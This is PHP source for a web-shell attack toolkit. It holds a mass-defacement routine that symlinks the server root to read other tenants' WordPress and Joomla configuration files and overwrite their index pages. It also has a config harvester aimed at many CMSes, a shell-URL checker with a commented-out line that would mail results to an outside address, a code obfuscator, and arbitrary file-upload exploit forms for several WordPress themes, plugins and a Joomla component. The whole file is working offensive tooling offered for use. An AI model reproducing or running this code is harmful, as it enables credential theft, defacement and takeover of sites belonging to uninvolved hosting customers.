$wordpress3=$url."/sym/root/home/".$user."/public_html/wp/wp-config.php";
 
// first joomla guess
if($joomla && preg_match('/dbprefix/i',$joomla)){
echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
echo '<td align="center"><font color="pink">JOOMLA</font></td>';
$res = index_changer_joomla($joomla, $index, $site_urlto);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($khaled, 'http://'.$site_urlto.'/templates/'.$res['template'].'/index.php<br>');
$count1 = $count1+1;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
}
// second joomla guess
if($joomla2 && preg_match('/dbprefix/i',$joomla2)){
echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
echo '<td align="center"><font color="pink">JOOMLA</font></td>';
$res = index_changer_joomla($joomla2, $index, $site_urlto);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($khaled, 'http://'.$site_urlto.'/joomla/'.$res['template'].'/index.php<br>');
$count1 = $count1+1;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
}
// third joomla guess
if($joomla3 && preg_match('/dbprefix/i',$joomla3)){
echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
echo '<td align="center"><font color="pink">JOOMLA</font></td>';
$res = index_changer_joomla($joomla3, $index, $site_urlto);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($khaled, 'http://'.$site_urlto.'/site/'.$res['template'].'/index.php<br>');
$count1 = $count1+1;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
}
 
// first wordpress guess
if($wordpress && preg_match('/DB_NAME/i',$wordpress)){
echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
$res = index_changer_wp($wordpress, $index);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($khaled, 'http://'.$site_urlto.'/wp-content/themes/'.$res['template'].'/index.php<br>');
$count2++;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
        }
               
// second wordpress guess
if($wordpress2 && preg_match('/DB_NAME/i',$wordpress2)){
echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
$res = index_changer_wp($wordpress2, $index);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($khaled, 'http://'.$site_urlto.'/blog/wp-content/themes/'.$res['template'].'/index.php<br>');
$count2++;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
        }
               
// third wordpress guess
if($wordpress3 && preg_match('/DB_NAME/i',$wordpress3)){
echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
$res = index_changer_wp($wordpress3, $index);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($khaled, 'http://'.$site_urlto.'/wp/wp-content/themes/'.$res['template'].'/index.php<br>');
$count2++;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
        }
       
}
echo '</table>';
echo '<hr/>';
echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';
echo '<a href="defaced.html" target="_blank">Show All</a> || <a href="?home">Home</a><br />';
}
 
elseif($_POST['mode']==1) {
    @mkdir('sym',0777);
    $wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $fp = @fopen ('sym/.htaccess','w');
    fwrite($fp, $wr);
    @symlink('/','sym/root');
    $dominios = @file_get_contents("/etc/named.conf");
    @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
    $out[1] = array_unique($out[1]);
    $numero_dominios = count($out[1]);
    echo "Total domains: $numero_dominios <br><br />";
    $def = $_POST['tunisia'];
    $base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';
    $output = fopen('defaced.html', 'a+');
        echo ("<center><table class='result' width='100%' border=1 cellspacing=1 cellpading=1>  
        <tr><th width=50%>domain</td><th width=25%>Type</td><th width=25%>Status</td></tr>");  
   $j = 1;
    $st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;
    for($i = $st; $i <= $numero_dominios; $i++)
    {
        $domain = $out[1][$i];
        $dono_arquivo = @fileowner("/etc/valiases/".$domain);
        $infos = @posix_getpwuid($dono_arquivo);
       
        if($infos['name']!='root') {
$config01 = @file_get_contents($base_url.$infos['name']."/public_html/configuration.php");
$config001 = @file_get_contents($base_url.$infos['name']."/public_html/joomla/configuration.php");
$config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");
$config03 = @file_get_contents($base_url.$infos['name']."/public_html/blog/wp-config.php");
 
if($config001 && preg_match('/dbprefix/i',$config001)){
echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
echo '<td align="center"><font color="pink">JOOMLA</font></td>';
$res = index_changer_joomla($config001, $def, $domain);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($output, 'http://'.$domain."<br>");
$count1 = $count+1;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
}
       
if($config01 && preg_match('/dbprefix/i',$config01)){
echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
echo '<td align="center"><font color="pink">JOOMLA</font></td>';
$res = index_changer_joomla($config01, $def, $domain);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($output, 'http://'.$domain."<br>");
$count1 = $count+1;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
}
 
if($config02 && preg_match('/DB_NAME/i',$config02)){
echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
$res = index_changer_wp($config02, $def);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($output, 'http://'.$domain."<br>");
$count2 = $count2+1;
} else {
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
}
if($config03 && preg_match('/DB_NAME/i',$config03)){
echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
$res = index_changer_wp($config03, $def);
echo '<td>'.$res['output'].'</td>';
if($res['cond']) {
echo '<td align="center"><span class="green">DEFACED</span></td>';
fwrite($output, 'http://'.$domain."<br>");
$count2 = $count2+1;
} else {    
echo '<td align="center"><span class="red">FAILED</span></td>';
}
echo '</tr>';
}
        }
    }
    echo '</table>';
    echo '<hr/>';
    echo 'Total Defaced = '.$count1 + $count2.' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';
        echo '<a href="defaced.html" target="_blank">Show All</a> || <a href="?home">Home</a><br />';
}
else {
echo '
<table>
<form method="post">
<tr>
        <td>index url : </td>
        <td><input type="text" size="60" name="tunisia" placeholder="put your index url here !"></td>
</tr>
<tr>
        <td>use : </td>
</tr>
<tr>
        <td><input type="radio" value="1" name="mode"></td><td>/etc/named.conf</td>
</tr>
<tr>
        <td><input type="radio" checked="checked" value="2" name="mode"></td><td>/var/named</td>
</tr>
<tr>
<td><br><input type="submit" name="tunisia_deface" value="Deface"></td></tr>
</table><br><br><br>
<font color=gold size=3>True attacker always moving in the shadow.<br>
<hr width=50%><br>&copy; Sinkaroid | Every flowers must have a great root.<br>Stupidc0de, Indonesian DeFucker</font>
</form>
</center>
</body>
</html>
';
}	
}
elseif(isset($_GET['liatdomain'])){
		echo"<font size='6' color='red'>
#DomainViewer
</font><p>";
echo'<form action="?liatdomain" method="post">
	<center><h2>Domain Viewer</h2></center><br><br>';

	function openBaseDir()
{
$openBaseDir = ini_get("open_basedir");
if (!$openBaseDir)
    {
        $openBaseDir = '<font color="green">OFF</font>';
    }
    else 
    {
        $openBaseDir = '<font color="red">ON</font>';
    }    
    return $openBaseDir;
}


echo '
    <table width="95%" cellspacing="0" cellpadding="0" class="td1" >
    <td height="100" align="left" class="td1">';
    $pg = basename(__FILE__);
    $safe_mode = @ini_get('safe_mode');
    $dir = @getcwd();
	////////////////////////////////////////////////////
	// LET'S PLAY ~
	##.htaccess
@mkdir('pee',0777);
@symlink("/","pee/root");
$htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
 
file_put_contents("pee/.htaccess",$htaccss);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);


##Symlink to the ROOT :p
foreach($etcz as $etz){
$etcc = explode(":",$etz);
error_reporting(0);

$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);

symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php',"pee/".$etcc[0].'-PhpBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',"pee/".$etcc[0].'-vBulletin.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php',"pee/".$etcc[0].'-IPB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php',"pee/".$etcc[0].'-MyBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php',"pee/".$etcc[0].'-SMF.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php',"pee/".$etcc[0].'-Drupal.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php',"pee/".$etcc[0].'-e107.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php',"pee/".$etcc[0].'-Seditio.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',"pee/".$etcc[0].'-osCommerce.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
}
#############################
	if(is_readable("/var/named")){
	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
	echo'<tr><td><center><b>SITE</b></center></td><td>
	<center><b>USER</b></center></td>
	<td></center><b>SYMLINK</b></center></td>';
	$list = scandir("/var/named");
	foreach($list as $domain){
	if(strpos($domain,".db")){
	$i += 1;
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));

	echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
	<td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>
	<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
		}
	}
	echo "<center>Total Domains Found: ".$i."</center><br />";
	}else{ 
	echo "<center>can't read [ /var/named ]</center>"; 
	}

 

##################################
error_reporting(0);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
if(is_readable("/etc/passwd")){

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';

$list = scandir("/var/named");

foreach($etcz as $etz){
$etcc = explode(":",$etz);

foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
if($owner['name'] == $etcc[0])
{
$i += 1;
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center>
<td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}}}}
echo "<center>Total Domains Found: ".$i."</center><br />";}

 
###############################
if(is_readable("/etc/named.conf")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
$named = file_get_contents("/etc/named.conf");
preg_match_all('%zone \"(.*)\" {%',$named,$domains);
foreach($domains[1] as $domain){
$domain = trim($domain);
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";

} else { echo "<center>can't read [ /etc/named.conf ]</center>"; }

 
############################
if(is_readable("/etc/valiases")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td>
<center><b>USER</b></center></td><td></center>
<b>SYMLINK</b></center></td>';
$list = scandir("/etc/valiases");
foreach($list as $domain){
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
<center><td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";
} else { echo "<center>can't read [ /etc/valiases ]</center>"; }

 
}
	
	
	elseif(isset($_GET['ch'])){
			echo"<font size='6' color='red'>
#ShellsChecker
</font><p>";
		
		echo "<br><style type=\"text/css\">
.entryfield {width:400px;height:150px;}
.subbtn {background:#b70505;color:white;border: 1px solid #000; padding:6px 6px 6px 6px;}
.subbtn:hover {background:#c0bfbf;color:#000000;}

.image {
    width: 250px;
    height: 250px;
    -webkit-animation:spin 8s linear infinite;
    -moz-animation:spin 8s linear infinite;
    animation:spin 8s linear infinite;
}
@-moz-keyframes spin { 100% { -moz-transform: rotate(-360deg); } }
@-webkit-keyframes spin { 100% { -webkit-transform: rotate(-360deg); } }
@keyframes spin { 100% { -webkit-transform: rotate(-360deg); transform:rotate(-360deg); } }


</style>

<font face='Ubuntu'>
<center>
<p>
<body bgcolor='black'>
<form name=\"frmcontadd\" action=\"\" method=\"post\">

  <textarea class=\"entryfield\" name=\"url\" cols=115 rows=10></textarea><br>
  <br>
  <input class=\"subbtn\" type=\"submit\" name=\"Submit\" value=\"  >  \">

</form>";
function get_http_response_code($theurl) {
    $headers = get_headers($theurl);
    $status = substr($headers[0], 9, 3);
    $p = parse_url($theurl);
    $host = explode(':', $p['host']);
    $hostname = $host[0];
    if ($status == 200) {
        $visitor = $_SERVER["REMOTE_ADDRS"];
        $judul = "shell: $theurl ";
        $body = "shell: $theurl";
        if (!empty($theurl)) {
/// I hate myself go delete this line            @mail("anakmancasan@gmail.com", $judul, $body);
        }
        $writeuRl = $theurl . "
";
        $fh = fopen("hasil.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=Green>OK</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } elseif ($status == 500) {
        echo "<strong><font color=black>" . $status . " 500</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } else {
        $writeuRl = $theurl . "
";
        $fh = fopen("sampah.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=red>Not Found</font></strong> - <i><a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</i></a><br />";
    }
}
if (isset($_POST['Submit'])) {
    $hosts = explode("
", $_POST['url']);
    $values = array();
    foreach ($hosts as $host) {
        if ($host != "") {
            @get_http_response_code("$host");
        }
    }
    
}
		
	}
	
	
	elseif(isset($_GET['def'])){
			echo"<font size='6' color='red'>
#DefaceChecker
</font><p>";
	echo '<html>
<head>

</style>
 
</head><br><center><font color="lime" size="6">
<b>Deface Page Checker</b></font>
<br><br>
<form method="post" action="">
<center><table class="style2"><tr><td>Site List: </td><td><textarea name="domain" cols="80" rows="10" class="style2"></textarea></td>
</tr>
<tr><td>Text: </td><td><input name="text" value="hacked by sc0" size="20" class="style2"></td>
</tr><tr></table>
<br />
<input type="submit" name="submit" value=" > "/>
</form></center><br />
';
if(isset($_POST['submit'])) {
$text = $_POST['text'];
$items = explode("\n", trim($_POST['domain']));
$items = array_unique(str_replace('http://','',$items));
$total = count($items);
echo '<div class="hid">Total Domains = '.$total.'</div><br />';
echo '<h3 class="hid">Checking Defaced sites</h3>';
echo '<table style="width:40%;margin:0 auto;">';
$j = 1;
$dc = 0;
$sites = array();
foreach($items as $s) {
$data = file_get_contents('http://'.trim($s));
$cond = strpos($data, $text);
$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';
if($cond !== false){ echo '<tr '.$cls.'><td><a href="http://'.$s.'" target="_blank">http://'.$s.'</a></td><td><span class="green">DEFACED</span></td></tr>'; $sites[] = trim($s); $dc++;
} else { echo '<tr '.$cls.'><td>http://'.$s.'</td><td><span class="red">Failed!</span></td></tr>'; }
$j++;
}
echo '</table><br />';
$total = $dc;
echo '<h3 class="hid">Total Defaced = '.$total.'</h3><br />';
}
echo '';

	}
	
	
	elseif(isset($_GET['enc0'])){
			echo"<font size='6' color='red'>
#PHPencoderdecoder
</font><p>";
		@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
		$text = $_POST['code'];
		echo'
<STYLE>

input {BORDER-RIGHT:#00FF00 1px solid;BORDER-TOP:#00FF00 1px solid;BORDER-LEFT:#00FF00 1px solid;BORDER-BOTTOM: #00FF00 1px solid;BACKGROUND-COLOR: #111111;COLOR: #00FF00;font: 8pt Verdana;}
select {BORDER-RIGHT:#00FF00 1px solid;BORDER-TOP:#00FF00 1px solid;BORDER-LEFT:#00FF00 1px solid;BORDER-BOTTOM: #00FF00 1px solid;BACKGROUND-COLOR: #111111;COLOR: #00FF00;font: 8pt Verdana;}
submit {BORDER-RIGHT:buttonhighlight 2px outset;BORDER-TOP:buttonhighlight 2px outset;BORDER-LEFT:buttonhighlight 2px outset;BORDER-BOTTOM: buttonhighlight 2px outset;BACKGROUND-COLOR: #000099;COLOR: #FFFF00;width: 10%;}

</STYLE>
<center>

<form method="post"><br>
<textarea class="inputz" cols=80 rows=10 name="code"></textarea><br><br>
<select class="inputz" size="1" name="ope">
<option value="urlencode">url</option>
<option value="base64">Base64</option>
<option value="ur">convert_uu</option>
<option value="json">json</option>
<option value="gzinflates">gzinflate - base64</option>
<option value="str2">str_rot13 - base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="gzinflater">gzinflate - str_rot13 - base64</option>
<option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew">str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="gzpress">gzcompress - base64</option>';
echo"</select>&nbsp;<br><br><input class='inputzbut' type='submit' name='submit' value='Encode'>
<input class='inputzbut' type='submit' name='submits' value='Decode'>
</form>";


$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;case 'gzpress' : $codi=base64_encode(gzcompress($text));
break;default:break;}}

$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $codi=utf8_decode(json_decode($text));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;case 'gzpress' : $codi=gzuncompress(base64_decode($text));
break;default:break;}}
$html = htmlentities(stripslashes($codi));
echo "<from><center><h3>RESULT</h3></center><textarea cols=80 rows=10 class='inputz' readonly>".$html."</textarea></from>";

	}
	
	elseif(isset($_GET['arrayx'])){
			echo"<font size='6' color='red'>
#ArrayUploader
</font><p>";
		
		echo'
		
		<body>
<form method="post">
	
	<center><H1>CSRF</H1>
	<pre> 
[<input type="text" name="url" size="50" height="10" placeholder="fullurl ex: https://memekshop/js/webforms/upload/index.php" style="margin: 5px auto; padding-left: 5px;" required>]<br>
[<input type="text" name="pf" size="20" height="10" placeholder="array ex:/files[]/qqfile/" style="margin: 5px auto; padding-left: 5px;" required>]<br>
<input type="submit" name="d" value="LOCK">
</center>
</form>
<script src="//code.jquery.com/jquery-1.10.2.js"></script>
<link href="http://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet">
	<script src="jquery.backstretch.min.js"></script>';
	
	$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
	echo "<br><center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='pencet'></form";
}
?>
</form>
<br><br><br>

</div><div id="hide"></div></div></div>
<center>
	<br><br>
--------------------
<br>charcoal Exploit<br>
--------------------<br>
<?php

$self = $_SERVER["PHP_SELF"];

echo 'Target';
echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url\" value=\"http://\">
<input type=\"submit\" value=\"Show Target\"></form>";
if(!isset($_GET['url'])){
$url = "";
}else
{
$url = $_GET['url'];
}
?>
<?php echo "Target is : $url"; ?>
<br>
<br>
<form enctype="multipart/form-data"
action="<?php echo "$url"; ?>/wp-content/themes/charcoal/functions/ > -handler.php" method="post" target="_blank">
<input name=" > file" type="file"/><br />
<input type="submit" value=" > " />
</form>  
</div>

<div id="kiri" align="center">
----------------------------------
<br>com_simplephotogallery Exploit<br>
----------------------------------<br>
<?php

$self = $_SERVER["PHP_SELF"];

echo 'Target';
echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url1\" value=\"http://\">
<input type=\"submit\" value=\"Show Target\"></form>";
if(!isset($_GET['url1'])){
$url1 = "";
}else
{
$url1 = $_GET['url1'];
}
?>
<?php echo "Target is : $url1"; ?>
<form method="POST" action="<?php echo "$url1"; ?>/administrator/components/com_simplephotogallery/lib/ > File.php" target="_blank" enctype="multipart/form-data" >
    <input type="file" name=" > file">
    <input type="hidden" name="jpath" value="..%2F..%2F..%2F..%2F" >
    <input type="submit" name="Submit" value=" > ">
</form>
</body>
</html></div>


-------------------------
<div id="kiri" align="center">
easy-gallery-pro Exploit<br>
-------------------------<br>
<?php

$self = $_SERVER["PHP_SELF"];

echo 'target<br>';
echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url2\" value=\"http://\">
<input type=\"submit\" value=\"Show Target\"></form>";
if(!isset($_GET['url2'])){
$url2 = "";
}else
{
$url2 = $_GET['url2'];
}


echo "Target is: $url2";
echo"<br><br><form method=\"POST\" action=\"$url2/wp-content/plugins/wp-easy-gallery-pro/admin/php.php\" target=\"_blank\" enctype=\"multipart/form-data\" >
<input type=\"jpg\" name=\"url\" value=\"./\" />
<input name=\"qqfile\" type=\"file\" />
<input type=\"submit\" value=\" > \" />
</form>
<br>
</div>
<div id=\"kiri\" align=\"center\">
<br> evolve Exploit<br>";
echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url2a\" value=\"http://\">
<input type=\"submit\" value=\"Show Target\"></form>";
if(!isset($_GET['url2a'])){
$url2a = "";
}else
{
$url2a = $_GET['url2a'];
}
echo "Target is: $url2a";
echo "<br><br><form method=\"POST\" action=\"$url2a/wp-content/themes/evolve/js/back-end/libraries/file > er/ > _handler.php\" target=\"_blank\" enctype=\"multipart/form-data\">
<input type=\"jpg\" name=\"url\" value=\"./\" />
<input name=\"qqfile\" type=\"file\" />
<input type=\"submit\" value=\" > \" />
</form>";
?></div>


<div align="center">
<?php

$self = $_SERVER["PHP_SELF"];

echo 'qualifire Exploit<br><br>Target';
echo "<form action=\"$self\" method=\"GET\"><input type=\"text\" name=\"url5\" value=\"http://\">
<br><input type=\"submit\" value=\"Show Target\"></form>";
if(!isset($_GET['url5'])){
$url5 = "";
}else
{
$url5 = $_GET['url5'];
}
?>
<?php echo "Target is : $url5"; ?>
<br>
<form
action="<?php echo "$url5"; ?>/wp-content/themes/qualifire/scripts/admin/ > ify/ > ify.php"
method="post" target="_blank" enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="Filedata" ><br>
<input type="submit" name="submit" value="Submit">
</form>
</div>
<br><br><br><BR><BR><BR>
<script src="//code.jquery.com/jquery-1.10.2.js"></script>
